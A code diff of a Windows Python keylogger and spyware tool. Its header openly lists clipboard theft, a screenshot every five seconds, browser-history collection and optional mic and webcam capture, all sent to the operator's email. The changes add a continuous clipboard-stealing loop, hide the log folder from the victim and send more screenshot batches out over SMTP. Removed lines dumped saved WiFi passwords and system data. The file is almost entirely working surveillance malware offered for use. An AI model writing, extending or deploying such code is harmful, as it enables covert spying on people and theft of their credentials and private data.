@@ -1,5 +1,26 @@
-import subprocess, socket, win32clipboard, os, re, smtplib, \
-        logging, pathlib, json, time, cv2, sounddevice, shutil
+#Features:
+# \ Sends clipboard data
+# \ Screenshots every 5 seconds 
+# \ Ability to enable microphone and webcam sharing (I disabled this because some cameras light up and some software report that the mic is being used)
+# \ Access the browser history
+# \ Everything is send to an outlook email (you can change it in line 100)
+# \ All you need to have is python 3 installed and everything will install itself when executed.
+
+from multiprocessing.connection import wait
+from os import getcwd
+from shutil import copy
+import sys
+import subprocess, socket, os, re, smtplib, \
+        logging, pathlib, json, time, shutil
+subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--upgrade', 'pip'])
+subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pywin32'])
+subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'opencv-python'])
+subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'browserhistory'])
+subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'Pillow'])
+subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'scipy'])
+subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'cryptography'])
+import win32clipboard
+import cv2
 import requests
 import browserhistory as bh
 from multiprocessing import Process
@@ -11,6 +32,9 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
+import win32con
+import win32api
+
 
 # Keystroke Capture Funtion #
 def logg_keys(file_path):
@@ -23,22 +47,32 @@ def logg_keys(file_path):
 
 # Screenshot Capture Function #
 def screenshot(file_path):
+    pathser = 'C:/Users/Public/Logs/Screenshots/screenshot19.png'
     pathlib.Path('C:/Users/Public/Logs/Screenshots').mkdir(parents=True, exist_ok=True)
-    screen_path = file_path + 'Screenshots\\'
+    pathlib.Path('C:/Users/Public/Logs/Screenshots2').mkdir(parents=True, exist_ok=True)
+    pathlib.Path('C:/Users/Public/Logs/Screenshots3').mkdir(parents=True, exist_ok=True)
 
     for x in range(0,60):
+        isFile = os.path.isfile(pathser)
+        if pathser == 'C:/Users/Public/Logs/Screenshots/screenshot19.png' and isFile == False: 
+            screen_path = file_path + 'Screenshots\\'
+        if isFile == True and pathser == 'C:/Users/Public/Logs/Screenshots/screenshot19.png':
+             screen_path = file_path + 'Screenshots2\\'
+             pathser = 'C:/Users/Public/Logs/Screenshots2/screenshot39.png'
+        if pathser == 'C:/Users/Public/Logs/Screenshots2/screenshot39.png' and isFile == False: screen_path = file_path + 'Screenshots2\\'
+        if pathser == 'C:/Users/Public/Logs/Screenshots2/screenshot39.png' and isFile == True: screen_path = file_path + 'Screenshots3\\'
         pic = ImageGrab.grab()
         pic.save(screen_path + 'screenshot{}.png'.format(x))
         time.sleep(5)
 
 # Mic Recording Function #
-def microphone(file_path):
-    for x in range(0, 5):
-        fs = 44100
-        seconds = 60
-        myrecording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
-        sounddevice.wait()
-        write_rec(file_path + '{}mic_recording.wav'.format(x), fs, myrecording)
+#def microphone(file_path):
+    #for x in range(0, 5):
+        #fs = 44100
+        #seconds = 60
+        #myrecording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
+        #sounddevice.wait()
+        #write_rec(file_path + '{}mic_recording.wav'.format(x), fs, myrecording)
 
 # Webcam Snapshot Function #
 def webcam(file_path):
@@ -47,13 +81,13 @@ def webcam(file_path):
     cam = cv2.VideoCapture(0)
 
     for x in range(0, 60):
-        ret, img = cam.read()
-        file = (cam_path  + '{}.jpg'.format(x))
-        cv2.imwrite(file, img)
+#        ret, img = cam.read()
+#        file = (cam_path  + '{}.jpg'.format(x))
+#        cv2.imwrite(file, img)
         time.sleep(5)
 
-    cam.release
-    cv2.destroyAllWindows
+    #cam.release
+    #cv2.destroyAllWindows
 
 def email_base(name, email_address):
     name['From'] = email_address
@@ -64,7 +98,7 @@ def email_base(name, email_address):
     return name
 
 def smtp_handler(email_address, password, name):
-    s = smtplib.SMTP('smtp.gmail.com', 587)
+    s = smtplib.SMTP('smtp.outlook.com', 587)
     s.starttls()
     s.login(email_address, password)
     s.sendmail(email_address, email_address, name.as_string())
@@ -79,12 +113,12 @@ def send_email(path):
     regex5 = re.compile(r'.+\.wav$')
 
     email_address = ''                      #<--- Enter your email address
-    password = ''                           #<--- Enter email password 
+    password = ''                    #<--- Enter email password 
     
     msg = MIMEMultipart()
     email_base(msg, email_address)
 
-    exclude = set(['Screenshots', 'WebcamPics'])
+    exclude = set(['Screenshots', 'WebcamPics', 'Screenshots2', 'Screenshots3'])
     for dirpath, dirnames, filenames in os.walk(path, topdown=True):
         dirnames[:] = [d for d in dirnames if d not in exclude]
         for file in filenames:
@@ -117,52 +151,21 @@ def send_email(path):
 
     smtp_handler(email_address, password, msg)
 
+##### Copy the clipboard ########################################################################################################
+def clipboard(file_path):
+    while True:
+        win32clipboard.OpenClipboard()
+        pasted_data = win32clipboard.GetClipboardData()
+        win32clipboard.CloseClipboard()
+        with open(file_path + 'clipboard_info.txt', 'a') as clipboard_info:
+            clipboard_info.write('\nClipboard Data: \n' + pasted_data)
+        time.sleep(10)
+
 def main():
     pathlib.Path('C:/Users/Public/Logs').mkdir(parents=True, exist_ok=True)
     file_path = 'C:\\Users\\Public\\Logs\\'
+    win32api.SetFileAttributes('C:\\Users\\Public\\Logs\\', win32con.FILE_ATTRIBUTE_HIDDEN)
 
-##### Retrieve Network/Wifi informaton for the network_wifi file ################################################################
-    with open(file_path + 'network_wifi.txt', 'a') as network_wifi:
-        try:
-            commands = subprocess.Popen([ 'Netsh', 'WLAN', 'export', 'profile', 
-                                        'folder=C:\\Users\\Public\\Logs\\', 'key=clear', 
-                                        '&', 'ipconfig', '/all', '&', 'arp', '-a', '&', 
-                                        'getmac', '-V', '&', 'route', 'print', '&', 'netstat', '-a'], 
-                                        stdout=network_wifi, stderr=network_wifi, shell=True)
-            outs, errs = commands.communicate(timeout=60)
-
-        except subprocess.TimeoutExpired:
-            commands.kill()
-            out, errs = commands.communicate()
-
-##### Retrieve system information for the system_info file ######################################################################
-    hostname = socket.gethostname()
-    IPAddr = socket.gethostbyname(hostname)
-
-    with open(file_path + 'system_info.txt', 'a') as system_info:
-        try:
-            public_ip = requests.get('https://api.ipify.org').text
-        except requests.ConnectionError:
-            public_ip = '* Ipify connection failed *'
-            pass
-
-        system_info.write('Public IP Address: ' + public_ip + '\n' \
-                          + 'Private IP Address: ' + IPAddr + '\n')
-        try:
-            get_sysinfo = subprocess.Popen(['systeminfo', '&', 'tasklist', '&', 'sc', 'query'], 
-                            stdout=system_info, stderr=system_info, shell=True)
-            outs, errs = get_sysinfo.communicate(timeout=15)
-
-        except subprocess.TimeoutExpired:
-            get_sysinfo.kill()
-            outs, errs = get_sysinfo.communicate()
-
-##### Copy the clipboard ########################################################################################################
-    win32clipboard.OpenClipboard()
-    pasted_data = win32clipboard.GetClipboardData()
-    win32clipboard.CloseClipboard()
-    with open(file_path + 'clipboard_info.txt', 'a') as clipboard_info:
-        clipboard_info.write('Clipboard Data: \n' + pasted_data)
 
 ##### Get the browsing history ##################################################################################################
     browser_history = []
@@ -177,16 +180,18 @@ def main():
     # record microphone, as well as webcam picures #
     p1 = Process(target=logg_keys, args=(file_path,)) ; p1.start()
     p2 = Process(target=screenshot, args=(file_path,)) ; p2.start()
-    p3 = Process(target=microphone, args=(file_path,)) ; p3.start()
-    p4 = Process(target=webcam, args=(file_path,)) ; p4.start()
+    #p3 = Process(target=microphone, args=(file_path,)) ; p3.start()
+    #p4 = Process(target=webcam, args=(file_path,)) ; p4.start()
+    p5 = Process(target=clipboard, args=(file_path,)) ; p5.start()
 
-    p1.join(timeout=300) ; p2.join(timeout=300) ; p3.join(timeout=300) ; p4.join(timeout=300)
+    p1.join(timeout=300) ; p2.join(timeout=300) ; p5.join(timeout=300) 
+#p3.join(timeout=300) p4.join(timeout=300)
 
-    p1.terminate() ; p2.terminate() ; p3.terminate() ; p4.terminate()
-
+    p1.terminate() ; p2.terminate() ; p5.terminate()#; p4.terminate()
+#p3.terminate()
+        
 ##### Encrypt files #############################################################################################################
-    files = [ 'network_wifi.txt', 'system_info.txt', 'clipboard_info.txt', 
-            'browser.txt', 'key_logs.txt' ]
+    files = [ 'browser.txt', 'key_logs.txt', 'clipboard_info.txt' ]
 
     regex = re.compile(r'.+\.xml$')
     dir_path = 'C:\\Users\\Public\\Logs'
@@ -212,6 +217,8 @@ def main():
 ##### Send encrypted files to email account #####################################################################################
     send_email('C:\\Users\\Public\\Logs')
     send_email('C:\\Users\\Public\\Logs\\Screenshots')
+    send_email('C:\\Users\\Public\\Logs\\Screenshots2')
+    send_email('C:\\Users\\Public\\Logs\\Screenshots3')
     send_email('C:\\Users\\Public\\Logs\\WebcamPics')
 
     # Clean Up Files #
